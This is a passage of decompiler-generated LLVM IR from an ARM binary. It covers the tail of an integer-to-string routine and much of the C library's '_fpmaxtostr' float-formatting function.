  store i32 %v1_f1cc, i32* %r5.global-to-local, align 4
  %v2_f1cc = icmp eq i32 %arg2, 0
  %v2_f1d0 = icmp eq i1 %v2_f1cc, false
  %v5_f1d0 = sext i1 %v2_f1d0 to i32
  %v6_f1d0 = sub i32 %v5_f1d0, %arg3
  store i32 %v6_f1d0, i32* %r6.global-to-local, align 4
  %v19_f1d0 = icmp eq i32 %v6_f1d0, 0
  store i1 %v19_f1d0, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f1e4

dec_label_pc_f1dc:                                ; preds = %dec_label_pc_f1bc, %entry
  br label %dec_label_pc_f1e4

dec_label_pc_f1e4:                                ; preds = %dec_label_pc_f1c8, %dec_label_pc_f1dc
  %storemerge = phi i8 [ 0, %dec_label_pc_f1dc ], [ 1, %dec_label_pc_f1c8 ]
  store i8 %storemerge, i8* %stack_var_-40, align 1
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_f1ec = load i32, i32* %r7.global-to-local, align 4
  %v2_f1f4 = udiv i32 -1, %v0_f1ec
  store i32 %v2_f1f4, i32* %fp.global-to-local, align 4
  %v2_f204 = urem i32 -1, %v0_f1ec
  %v1_f208 = add i32 %v2_f204, 1
  store i32 %v1_f208, i32* %sb.global-to-local, align 4
  %v9_f20c = icmp eq i32 %v1_f208, %v0_f1ec
  store i1 %v9_f20c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f20c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_f1e4
  %v1_f210 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_f210, i32* %sb.global-to-local, align 4
  %v2_f214 = add i32 %v2_f1f4, 1
  store i32 %v2_f214, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f1e4, %bb
  %v0_f218 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_f218, i32* %sl.global-to-local, align 4
  %v0_f21c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_f21c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f220

dec_label_pc_f220thread-pre-split:                ; preds = %bb21
  %v0_f220.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_f228.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f220

dec_label_pc_f220:                                ; preds = %dec_label_pc_f220thread-pre-split, %.thread
  %v0_f290 = phi i32 [ %v0_f228.pre, %dec_label_pc_f220thread-pre-split ], [ %v0_f1ec, %.thread ]
  %v0_f23c = phi i32 [ %v0_f220.pr, %dec_label_pc_f220thread-pre-split ], [ %v0_f218, %.thread ]
  %v2_f220 = icmp eq i32 %v0_f23c, 0
  store i1 %v2_f220, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f220, label %dec_label_pc_f28c, label %dec_label_pc_f230

dec_label_pc_f230:                                ; preds = %dec_label_pc_f220
  %v2_f230 = urem i32 %v0_f23c, %v0_f290
  %v2_f240 = udiv i32 %v0_f23c, %v0_f290
  store i32 %v2_f240, i32* %sl.global-to-local, align 4
  %v0_f24c = load i32, i32* %r6.global-to-local, align 4
  %v2_f250 = urem i32 %v0_f24c, %v0_f290
  %v1_f258 = load i32, i32* %sb.global-to-local, align 4
  %v3_f258 = mul i32 %v1_f258, %v2_f230
  %v4_f258 = add i32 %v3_f258, %v2_f250
  store i32 %v4_f258, i32* %r5.global-to-local, align 4
  %v2_f260 = udiv i32 %v0_f24c, %v0_f290
  %v0_f268 = load i32, i32* %fp.global-to-local, align 4
  %v3_f268 = mul i32 %v0_f268, %v2_f230
  %v4_f268 = add i32 %v3_f268, %v2_f260
  %v2_f270 = udiv i32 %v4_f258, %v0_f290
  %v2_f278 = add i32 %v4_f268, %v2_f270
  br label %dec_label_pc_f2ac

dec_label_pc_f28c:                                ; preds = %dec_label_pc_f220
  %v0_f28c = load i32, i32* %r6.global-to-local, align 4
  %v2_f2a4 = udiv i32 %v0_f28c, %v0_f290
  br label %dec_label_pc_f2ac

dec_label_pc_f2ac:                                ; preds = %dec_label_pc_f230, %dec_label_pc_f28c
  %storemerge24 = phi i32 [ %v2_f2a4, %dec_label_pc_f28c ], [ %v2_f278, %dec_label_pc_f230 ]
  %v0_f2c8 = phi i32 [ %v2_f2a4, %dec_label_pc_f28c ], [ %v2_f278, %dec_label_pc_f230 ]
  %v1_f2c8 = phi i32 [ 0, %dec_label_pc_f28c ], [ %v2_f240, %dec_label_pc_f230 ]
  %v4_f258.pn = phi i32 [ %v0_f28c, %dec_label_pc_f28c ], [ %v4_f258, %dec_label_pc_f230 ]
  store i32 %storemerge24, i32* %r6.global-to-local, align 4
  %v0_f2b4 = urem i32 %v4_f258.pn, %v0_f290
  %v3_f2ac = load i32, i32* %stack_var_0, align 4
  %v2_f2b0 = icmp ugt i32 %v0_f2b4, 8
  %v7_f2b0 = icmp eq i32 %v0_f2b4, 9
  store i1 %v7_f2b0, i1* %cpsr_z.global-to-local, align 1
  %v1_f2b8 = add i32 %v0_f2b4, 48
  %v0_f2c0 = load i32, i32* %r8.global-to-local, align 4
  %v1_f2c0 = add i32 %v0_f2c0, -1
  store i32 %v1_f2c0, i32* %r8.global-to-local, align 4
  %v2_f2c4 = xor i1 %v7_f2b0, true
  %v3_f2c4 = and i1 %v2_f2b0, %v2_f2c4
  %extract.t = trunc i32 %v1_f2b8 to i8
  br i1 %v3_f2c4, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_f2ac
  %v2_f2b4 = add i32 %v3_f2ac, %v0_f2b4
  %extract.t8 = trunc i32 %v2_f2b4 to i8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_f2ac, %bb20
  %v0_f2cc.off0 = phi i8 [ %extract.t, %dec_label_pc_f2ac ], [ %extract.t8, %bb20 ]
  %v2_f2c8 = or i32 %v0_f2c8, %v1_f2c8
  %v4_f2c8 = icmp eq i32 %v2_f2c8, 0
  store i1 %v4_f2c8, i1* %cpsr_z.global-to-local, align 1
  %v3_f2cc = inttoptr i32 %v1_f2c0 to i8*
  store i8 %v0_f2cc.off0, i8* %v3_f2cc, align 1
  %v0_f2d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f2d0, label %dec_label_pc_f2d4, label %dec_label_pc_f220thread-pre-split

dec_label_pc_f2d4:                                ; preds = %bb21
  %v2_f2d4 = load i8, i8* %stack_var_-40, align 1
  %v2_f2d8 = icmp eq i8 %v2_f2d4, 0
  store i1 %v2_f2d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f2d8, label %dec_label_pc_f2d4..thread2_crit_edge, label %bb22

dec_label_pc_f2d4..thread2_crit_edge:             ; preds = %dec_label_pc_f2d4
  %v0_f2e4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb22:                                             ; preds = %dec_label_pc_f2d4
  %v3_f2e0 = load i32, i32* %r8.global-to-local, align 4
  %v4_f2e0 = add i32 %v3_f2e0, -1
  %v5_f2e0 = inttoptr i32 %v4_f2e0 to i8*
  store i8 45, i8* %v5_f2e0, align 1
  %v6_f2e0 = load i32, i32* %r8.global-to-local, align 4
  %v7_f2e0 = add i32 %v6_f2e0, -1
  store i32 %v7_f2e0, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_f2d4..thread2_crit_edge, %bb22
  %v0_f2e4 = phi i32 [ %v0_f2e4.pre, %dec_label_pc_f2d4..thread2_crit_edge ], [ %v7_f2e0, %bb22 ]
  ret i32 %v0_f2e4

; uselistorder directives
  uselistorder i32 %v0_f2b4, { 3, 2, 1, 0 }
  uselistorder i32 %v0_f290, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 45, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_f2ac, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_f1e4, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp151 = call i8 @__decompiler_undefined_function_1()
  %stack_var_-50 = alloca i8, align 1
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-86 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-85 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_f2f0 = load i32, i32* @r4, align 4
  store i32 %v3_f2f0, i32* %stack_var_-36, align 4
  %v6_f2f0 = load i32, i32* @r5, align 4
  %v9_f2f0 = load i32, i32* @r6, align 4
  %v12_f2f0 = load i32, i32* @r7, align 4
  %v15_f2f0 = load i32, i32* @r8, align 4
  %v18_f2f0 = load i32, i32* @sb, align 4
  %v1_f2f8 = add i32 %tmp, 8
  %v2_f2f8 = inttoptr i32 %v1_f2f8 to i8*
  %v3_f2f8 = load i8, i8* %v2_f2f8, align 1
  %v4_f2f8 = zext i8 %v3_f2f8 to i32
  store i32 %v4_f2f8, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %fp.global-to-local, align 4
  %v1_f300 = or i32 %v4_f2f8, 32
  %v2_f304 = ptrtoint i32* %stack_var_-184 to i32
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_f308 = icmp ult i32 %v1_f300, 97
  store i1 %v6_f308, i1* %cpsr_n.global-to-local, align 1
  %v7_f308 = icmp eq i32 %v1_f300, 97
  store i1 %v7_f308, i1* %cpsr_z.global-to-local, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  %v2_f314 = load i32, i32* %arg4, align 4
  store i32 %v2_f314, i32* %r8.global-to-local, align 4
  br i1 %v7_f308, label %bb, label %bb180

bb:                                               ; preds = %entry
  %v2_f318 = add nuw nsw i32 %v4_f2f8, 6
  store i32 %v2_f318, i32* %r3.global-to-local, align 4
  br label %bb180

bb180:                                            ; preds = %entry, %bb
  %v1_f32c = phi i32 [ 101, %entry ], [ %v2_f318, %bb ]
  store i32 %arg2, i32* %stack_var_-192, align 4
  %v1_f324 = add i32 %tmp, 12
  %v2_f324 = inttoptr i32 %v1_f324 to i32*
  %v3_f324 = load i32, i32* %v2_f324, align 4
  store i32 %v3_f324, i32* %r2.global-to-local, align 4
  %v1_f328 = add i32 %tmp, 4
  %v2_f328 = inttoptr i32 %v1_f328 to i32*
  %v3_f328 = load i32, i32* %v2_f328, align 4
  store i32 %v3_f328, i32* %r1.global-to-local, align 4
  br i1 %v7_f308, label %bb181, label %bb182

bb181:                                            ; preds = %bb180
  %v2_f32c = urem i32 %v1_f32c, 256
  store i32 %v2_f32c, i32* %r7.global-to-local, align 4
  br label %bb182

bb182:                                            ; preds = %bb180, %bb181
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f330 = icmp slt i32 %v2_f314, 0
  store i1 %v1_f330, i1* %cpsr_n.global-to-local, align 1
  %v2_f330 = icmp eq i32 %v2_f314, 0
  store i1 %v2_f330, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v1_f330, label %bb183, label %bb184

bb183:                                            ; preds = %bb182
  store i32 6, i32* %r8.global-to-local, align 4
  br label %bb184

bb184:                                            ; preds = %bb182, %bb183
  %v1_f33c = and i32 %v3_f324, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_f33c = icmp eq i32 %v1_f33c, 0
  store i1 %v2_f33c, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-50, align 1
  store i32 %arg1, i32* %stack_var_-192, align 4
  br i1 %v2_f33c, label %dec_label_pc_f350, label %dec_label_pc_f3c0

dec_label_pc_f350:                                ; preds = %bb184
  %v1_f350 = urem i32 %v3_f324, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_f350 = icmp eq i32 %v1_f350, 0
  store i1 %v2_f350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f350, label %.thread10, label %dec_label_pc_f3c0

dec_label_pc_f3c0:                                ; preds = %dec_label_pc_f350, %bb184
  %storemerge = phi i8 [ 43, %bb184 ], [ 32, %dec_label_pc_f350 ]
  store i8 %storemerge, i8* %stack_var_-50, align 1
  %v2_f3c4 = add i32 %tmp, 16
  %v3_f3c4 = inttoptr i32 %v2_f3c4 to i32*
  store i32 32, i32* %v3_f3c4, align 4
  %v0_f3cc = load i32, i32* %r7.global-to-local, align 4
  %v1_f3cc = add i32 %v0_f3cc, -96
  %v3_f3cc = sub i32 95, %v0_f3cc
  %v4_f3cc = and i32 %v3_f3cc, %v0_f3cc
  %v5_f3cc = icmp slt i32 %v4_f3cc, 0
  store i1 %v5_f3cc, i1* %cpsr_v.global-to-local, align 1
  %v6_f3cc = icmp slt i32 %v1_f3cc, 0
  store i1 %v6_f3cc, i1* %cpsr_n.global-to-local, align 1
  %v7_f3cc = icmp eq i32 %v0_f3cc, 96
  store i1 %v7_f3cc, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-168, align 4
  %tmp242 = icmp ult i32 %v0_f3cc, 97
  br i1 %tmp242, label %bb185, label %.thread105

bb185:                                            ; preds = %dec_label_pc_f3c0
  store i32 12, i32* %r3.global-to-local, align 4
  br label %.thread105

.thread105:                                       ; preds = %dec_label_pc_f3c0, %bb185
  %v4_f3e4 = phi i32 [ 12, %bb185 ], [ 3, %dec_label_pc_f3c0 ]
  %v4_f3e4..v1_f374 = select i1 %tmp242, i32 %v4_f3e4, i32 8
  store i32 ptrtoint ([4 x i8]* @global_var_1496c.664 to i32), i32* %r2.global-to-local, align 4
  %v2_f3f0 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_f3f0, i32* %r6.global-to-local, align 4
  %v2_f3f4 = add i32 %v4_f3e4..v1_f374, ptrtoint ([4 x i8]* @global_var_1496c.664 to i32)
  store i32 %v2_f3f4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f878

.thread10:                                        ; preds = %dec_label_pc_f350
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  %v2_f47c = ptrtoint i32* %stack_var_-85 to i32
  store i32 %v2_f47c, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f484

dec_label_pc_f484:                                ; preds = %dec_label_pc_f4f4, %.thread10
  %v3_f498 = phi i32 [ %v2_f4e4, %dec_label_pc_f4f4 ], [ %v3_f2f0, %.thread10 ]
  %v1_f498 = phi i1 [ %v5_f4f8, %dec_label_pc_f4f4 ], [ false, %.thread10 ]
  %v0_f498 = phi i1 [ %v6_f4f8, %dec_label_pc_f4f4 ], [ false, %.thread10 ]
  %v2_f498 = xor i1 %v1_f498, %v0_f498
  br i1 %v2_f498, label %bb187, label %bb186

bb186:                                            ; preds = %dec_label_pc_f484
  %v4_f498 = sub i32 0, %v3_f498
  store i32 %v4_f498, i32* %r4.global-to-local, align 4
  br label %bb187

bb187:                                            ; preds = %dec_label_pc_f484, %bb186
  %v0_f49c = phi i32 [ %v3_f498, %dec_label_pc_f484 ], [ %v4_f498, %bb186 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f49c = icmp slt i32 %v0_f49c, 0
  store i1 %v1_f49c, i1* %cpsr_n.global-to-local, align 1
  %v2_f49c = icmp eq i32 %v0_f49c, 0
  store i1 %v2_f49c, i1* %cpsr_z.global-to-local, align 1
  %v0_f4b8 = load i32, i32* %sl.global-to-local, align 4
  %v1_f4b8 = add i32 %v0_f4b8, 9
  store i32 %v1_f4b8, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_f4c0

dec_label_pc_f4c0:                                ; preds = %dec_label_pc_f4c0.dec_label_pc_f4c0_crit_edge, %bb187
  %v1_f4d4 = phi i32 [ %v1_f4d4.pre, %dec_label_pc_f4c0.dec_label_pc_f4c0_crit_edge ], [ %v1_f4b8, %bb187 ]
  %v0_f4cc = phi i32 [ %v0_f4e8, %dec_label_pc_f4c0.dec_label_pc_f4c0_crit_edge ], [ 0, %bb187 ]
  %v0_f4d8 = phi i32 [ %v2_f4e4, %dec_label_pc_f4c0.dec_label_pc_f4c0_crit_edge ], [ %v0_f49c, %bb187 ]
  %v2_f4c8 = urem i32 %v0_f4d8, 10
  %v1_f4cc = add i32 %v0_f4cc, 1
  store i32 %v1_f4cc, i32* %r5.global-to-local, align 4
  %v1_f4d0 = or i32 %v2_f4c8, 48
  store i32 %v1_f4d0, i32* %r2.global-to-local, align 4
  %v2_f4d4 = sub i32 %v1_f4d4, %v1_f4cc
  store i32 %v2_f4d4, i32* %r3.global-to-local, align 4
  store i32 %v0_f4d8, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_f4e0 = trunc i32 %v1_f4d0 to i8
  %v3_f4e0 = inttoptr i32 %v2_f4d4 to i8*
  store i8 %v1_f4e0, i8* %v3_f4e0, align 1
  %v0_f4e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_f4e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_f4e4 = udiv i32 %v0_f4e4, %v1_f4e4
  store i32 %v2_f4e4, i32* %r0.global-to-local, align 4
  %v0_f4e8 = load i32, i32* %r5.global-to-local, align 4
  %v1_f4e8 = add i32 %v0_f4e8, -8
  %v3_f4e8 = sub i32 7, %v0_f4e8
  %v4_f4e8 = and i32 %v3_f4e8, %v0_f4e8
  %v5_f4e8 = icmp slt i32 %v4_f4e8, 0
  store i1 %v5_f4e8, i1* %cpsr_v.global-to-local, align 1
  %v6_f4e8 = icmp slt i32 %v1_f4e8, 0
  store i1 %v6_f4e8, i1* %cpsr_n.global-to-local, align 1
  %v7_f4e8 = icmp eq i32 %v0_f4e8, 8
  store i1 %v7_f4e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_f4e4, i32* %r4.global-to-local, align 4
  %v7_f4f0 = icmp slt i32 %v0_f4e8, 9
  br i1 %v7_f4f0, label %dec_label_pc_f4c0.dec_label_pc_f4c0_crit_edge, label %dec_label_pc_f4f4

dec_label_pc_f4c0.dec_label_pc_f4c0_crit_edge:    ; preds = %dec_label_pc_f4c0
  %v1_f4d4.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_f4c0

dec_label_pc_f4f4:                                ; preds = %dec_label_pc_f4c0
  %v0_f4f4 = load i32, i32* %r6.global-to-local, align 4
  %v1_f4f4 = add i32 %v0_f4f4, 1
  store i32 %v1_f4f4, i32* %r6.global-to-local, align 4
  %v3_f4f8 = sub i32 -1, %v0_f4f4
  %v4_f4f8 = and i32 %v1_f4f4, %v3_f4f8
  %v5_f4f8 = icmp slt i32 %v4_f4f8, 0
  store i1 %v5_f4f8, i1* %cpsr_v.global-to-local, align 1
  %v6_f4f8 = icmp slt i32 %v0_f4f4, 0
  store i1 %v6_f4f8, i1* %cpsr_n.global-to-local, align 1
  %v7_f4f8 = icmp eq i32 %v0_f4f4, 0
  store i1 %v7_f4f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4f8, label %dec_label_pc_f484, label %dec_label_pc_f500

dec_label_pc_f500:                                ; preds = %dec_label_pc_f4f4
  %v0_f500 = load i32, i32* %r7.global-to-local, align 4
  %v1_f500 = add i32 %v0_f500, -96
  %v3_f500 = sub i32 95, %v0_f500
  %v4_f500 = and i32 %v3_f500, %v0_f500
  %v5_f500 = icmp slt i32 %v4_f500, 0
  store i1 %v5_f500, i1* %cpsr_v.global-to-local, align 1
  %v6_f500 = icmp slt i32 %v1_f500, 0
  store i1 %v6_f500, i1* %cpsr_n.global-to-local, align 1
  %v7_f500 = icmp eq i32 %v0_f500, 96
  store i1 %v7_f500, i1* %cpsr_z.global-to-local, align 1
  %tmp243 = icmp ult i32 %v0_f500, 97
  br i1 %tmp243, label %bb188, label %thread-pre-split

bb188:                                            ; preds = %dec_label_pc_f500
  %v5_f50c = add i32 %v0_f500, 32
  store i32 %v5_f50c, i32* %r3.global-to-local, align 4
  %v5_f510 = urem i32 %v5_f50c, 256
  store i32 %v5_f510, i32* %r7.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_f500, %bb188
  %stack_var_-66.0108114 = phi i8 [ 69, %bb188 ], [ %tmp151, %dec_label_pc_f500 ]
  %v0_f530 = phi i32 [ %v5_f510, %bb188 ], [ %v0_f500, %dec_label_pc_f500 ]
  %v7_f514 = icmp eq i32 %v0_f530, 103
  %.229 = zext i1 %v7_f514 to i32
  store i32 %.229, i32* %r3.global-to-local, align 4
  %v0_f520 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f520 = icmp slt i32 %v0_f520, 0
  store i1 %v1_f520, i1* %cpsr_n.global-to-local, align 1
  %v2_f520 = icmp eq i32 %v0_f520, 0
  store i1 %v2_f520, i1* %cpsr_z.global-to-local, align 1
  %tmp191 = icmp slt i32 %v0_f520, 1
  br i1 %tmp191, label %.thread13, label %bb192

.thread13:                                        ; preds = %thread-pre-split
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb194

bb192:                                            ; preds = %thread-pre-split
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_f528 = icmp eq i1 %v7_f514, false
  store i1 %v2_f528, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f528, label %bb194, label %bb193

bb193:                                            ; preds = %bb192
  %v2_f52c = add i32 %v0_f520, -1
  store i32 %v2_f52c, i32* %r8.global-to-local, align 4
  br label %bb194

bb194:                                            ; preds = %.thread13, %bb192, %bb193
  %v0_f53c = phi i32 [ %v0_f520, %.thread13 ], [ %v0_f520, %bb192 ], [ %v2_f52c, %bb193 ]
  %v1_f530 = add i32 %v0_f530, -102
  %v3_f530 = sub i32 101, %v0_f530
  %v4_f530 = and i32 %v3_f530, %v0_f530
  %v5_f530 = icmp slt i32 %v4_f530, 0
  store i1 %v5_f530, i1* %cpsr_v.global-to-local, align 1
  %v6_f530 = icmp slt i32 %v1_f530, 0
  store i1 %v6_f530, i1* %cpsr_n.global-to-local, align 1
  %v7_f530 = icmp eq i32 %v0_f530, 102
  store i1 %v7_f530, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f530, label %dec_label_pc_f53c, label %bb195

bb195:                                            ; preds = %bb194
  store i32 %v0_f53c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_f560

dec_label_pc_f53c:                                ; preds = %bb194
  %v1_f53c = load i32, i32* %sb.global-to-local, align 4
  %v2_f53c = add i32 %v1_f53c, %v0_f53c
  store i32 %v2_f53c, i32* %ip.global-to-local, align 4
  %v2_f540 = add i32 %v2_f53c, 1
  %v4_f540 = sub i32 0, %v2_f53c
  %v5_f540 = and i32 %v2_f540, %v4_f540
  %v6_f540 = icmp slt i32 %v5_f540, 0
  store i1 %v6_f540, i1* %cpsr_v.global-to-local, align 1
  %v7_f540 = icmp slt i32 %v2_f540, 0
  store i1 %v7_f540, i1* %cpsr_n.global-to-local, align 1
  %v8_f540 = icmp eq i32 %v2_f540, 0
  store i1 %v8_f540, i1* %cpsr_z.global-to-local, align 1
  %v6_f544 = icmp slt i32 %v2_f53c, -1
  br i1 %v6_f544, label %dec_label_pc_f548, label %dec_label_pc_f560

dec_label_pc_f548:                                ; preds = %dec_label_pc_f53c
  %v2_f548 = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_f548, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_f554 = bitcast i32* %stack_var_-87 to i8*
  %v3_f554 = call i32 @__GI_memset(i8* %v2_f554, i32 48)
  store i32 %v3_f554, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_f560

dec_label_pc_f560:                                ; preds = %dec_label_pc_f53c, %bb195, %dec_label_pc_f548
  %v1_f5a469 = phi i32 [ %v2_f4e4, %bb195 ], [ %v3_f554, %dec_label_pc_f548 ], [ %v2_f4e4, %dec_label_pc_f53c ]
  %v1_f588 = phi i32 [ %v0_f53c, %bb195 ], [ -1, %dec_label_pc_f548 ], [ %v2_f53c, %dec_label_pc_f53c ]
  %v1_f564 = add i32 %v1_f588, -16
  %v3_f564 = sub i32 15, %v1_f588
  %v4_f564 = and i32 %v3_f564, %v1_f588
  %v5_f564 = icmp slt i32 %v4_f564, 0
  store i1 %v5_f564, i1* %cpsr_v.global-to-local, align 1
  %v6_f564 = icmp slt i32 %v1_f564, 0
  store i1 %v6_f564, i1* %cpsr_n.global-to-local, align 1
  %v7_f564 = icmp eq i32 %v1_f588, 16
  store i1 %v7_f564, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-86, align 4
  %v2_f570 = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_f570, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-87, align 4
  %v7_f578 = icmp sgt i32 %v1_f588, 16
  br i1 %v7_f578, label %.thread18, label %dec_label_pc_f584

.thread18:                                        ; preds = %dec_label_pc_f560
  store i32 0, i32* %r0.global-to-local, align 4
  %v10_f57c = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v10_f57c, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_f584:                                ; preds = %dec_label_pc_f560
  %v2_f584 = ptrtoint i32* %stack_var_-86 to i32
  %v2_f588 = add i32 %v1_f588, %v2_f584
  store i32 %v2_f588, i32* %r3.global-to-local, align 4
  %v1_f58c = add i32 %v2_f588, 2
  %v2_f58c = inttoptr i32 %v1_f58c to i8*
  %v3_f58c = load i8, i8* %v2_f58c, align 1
  %v4_f58c = zext i8 %v3_f58c to i32
  store i32 %v4_f58c, i32* %r2.global-to-local, align 4
  store i32 %v1_f58c, i32* %r1.global-to-local, align 4
  %v2_f594 = icmp ugt i8 %v3_f58c, 51
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_f594 = icmp ult i8 %v3_f58c, 52
  store i1 %v6_f594, i1* %cpsr_n.global-to-local, align 1
  %v7_f594 = icmp eq i8 %v3_f58c, 52
  store i1 %v7_f594, i1* %cpsr_z.global-to-local, align 1
  %v2_f598 = xor i1 %v2_f594, true
  %v3_f598 = or i1 %v7_f594, %v2_f598
  br i1 %v3_f598, label %bb196, label %bb197

bb196:                                            ; preds = %dec_label_pc_f584
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb197

bb197:                                            ; preds = %dec_label_pc_f584, %bb196
  %v1_f5a468 = phi i32 [ %v1_f5a469, %dec_label_pc_f584 ], [ 0, %bb196 ]
  %v2_f59c = xor i1 %v7_f594, true
  %v3_f59c = and i1 %v2_f594, %v2_f59c
  br i1 %v3_f59c, label %bb198, label %.preheader

bb198:                                            ; preds = %bb197
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %.thread18, %bb197, %bb198, %.backedge
  %v1_f5a4 = phi i32 [ %v1_f5a4.pre, %.backedge ], [ 0, %.thread18 ], [ %v1_f5a468, %bb197 ], [ 1, %bb198 ]
  %v0_f5a0 = phi i32 [ %v0_f5ac, %.backedge ], [ %v10_f57c, %.thread18 ], [ %v1_f58c, %bb197 ], [ %v1_f58c, %bb198 ]
  %v1_f5a0 = add i32 %v0_f5a0, -1
  %v2_f5a0 = inttoptr i32 %v1_f5a0 to i8*
